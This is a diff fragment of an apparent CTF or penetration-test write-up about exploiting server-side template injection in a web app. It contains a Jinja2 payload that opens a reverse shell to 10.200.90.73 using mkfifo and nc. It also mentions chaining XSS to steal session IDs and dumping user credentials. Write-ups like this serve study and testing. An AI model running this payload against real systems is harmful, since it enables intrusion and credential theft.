@@ -155,7 +155,7 @@ It renders my payload, this can be turned into another RCE vector
 
 When this is chained with something like XSS it can be used to exfil session IDs bypass MFA and reset accounts, leading to full account takeover
 
-# Shell on the system
+# Shell as root on the system
 
 ```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.200.90.73 1337 >/tmp/f').read() }}
@@ -169,4 +169,12 @@ Ill send this payload
 
 Then i now have a shell on the system
 
-With this i can su
+With this i can dump all credentials of the users
+
+![](Pasted%20image%2020260903134349.png)
+
+Looking at `app.py` i see there is an api which holds user info
+
+```python
+
+```
